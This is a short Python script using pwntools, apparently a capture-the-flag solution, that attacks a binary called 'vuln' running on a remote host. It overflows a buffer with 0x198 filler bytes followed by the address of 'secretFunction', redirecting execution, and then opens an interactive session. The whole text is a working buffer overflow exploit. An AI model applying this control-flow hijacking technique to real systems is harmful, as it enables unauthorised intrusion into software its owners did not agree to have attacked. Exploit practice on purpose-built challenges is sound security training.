from pwn import *
elf = context.binary = ELF("./vuln", checksec=False)

# p = process('./vuln')
p = remote("34.125.199.248", 4056)

flag = p32(elf.symbols.secretFunction)
payload = b"A"*0x198 + flag

p.sendlineafter(b"Enter some text:", payload)
p.interactive()